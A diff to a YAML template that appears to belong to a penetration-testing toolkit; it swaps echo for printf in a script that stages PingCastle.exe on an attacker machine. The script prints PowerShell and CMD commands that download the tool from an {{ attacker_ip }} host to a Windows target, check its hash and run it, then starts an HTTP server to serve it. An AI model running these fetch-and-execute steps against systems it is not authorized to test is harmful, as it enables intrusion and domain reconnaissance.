@@ -8,20 +8,20 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; cp -n {{ tools_dir }}/pingcastle/PingCastle.exe packstation/outbound;
-  echo '================================================================';
-  echo '                  -----Checksum Reference-----                  ';
+  printf '%s\n' '================================================================';
+  printf '%s\n' '                  -----Checksum Reference-----                  ';
   sha256sum packstation/outbound/PingCastle.exe | tee packstation/outbound/PingCastle.exe.sha256;
-  echo '================================================================';
-  echo '                      -----PowerShell-----                      ';
-  echo 'Deliver: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PingCastle.exe -Outfile {{ delivery_path_windows }}\PingCastle.exe';
-  echo 'Verify : Get-FileHash {{ delivery_path_windows }}\PingCastle.exe -Algorithm SHA256';
-  echo 'Expect : (compare with attacker hash above)';
-  echo 'Execute: cd {{ delivery_path_windows }}; .\PingCastle.exe --healthcheck';
-  echo '================================================================';
-  echo '                         -----CMD-----                          ';
-  echo 'Deliver: powershell -c "iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PingCastle.exe -Outfile {{ delivery_path_windows }}\PingCastle.exe"';
-  echo 'Verify : certutil -hashfile {{ delivery_path_windows }}\PingCastle.exe SHA256';
-  echo 'Expect : (compare with attacker hash above)';
-  echo 'Execute: cd /d {{ delivery_path_windows }} && PingCastle.exe --healthcheck';
-  echo '================================================================';
+  printf '%s\n' '================================================================';
+  printf '%s\n' '                      -----PowerShell-----                      ';
+  printf '%s\n' 'Deliver: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PingCastle.exe -Outfile {{ delivery_path_windows }}\PingCastle.exe';
+  printf '%s\n' 'Verify : Get-FileHash {{ delivery_path_windows }}\PingCastle.exe -Algorithm SHA256';
+  printf '%s\n' 'Expect : (compare with attacker hash above)';
+  printf '%s\n' 'Execute: cd {{ delivery_path_windows }}; .\PingCastle.exe --healthcheck';
+  printf '%s\n' '================================================================';
+  printf '%s\n' '                         -----CMD-----                          ';
+  printf '%s\n' 'Deliver: powershell -c "iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PingCastle.exe -Outfile {{ delivery_path_windows }}\PingCastle.exe"';
+  printf '%s\n' 'Verify : certutil -hashfile {{ delivery_path_windows }}\PingCastle.exe SHA256';
+  printf '%s\n' 'Expect : (compare with attacker hash above)';
+  printf '%s\n' 'Execute: cd /d {{ delivery_path_windows }} && PingCastle.exe --healthcheck';
+  printf '%s\n' '================================================================';
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
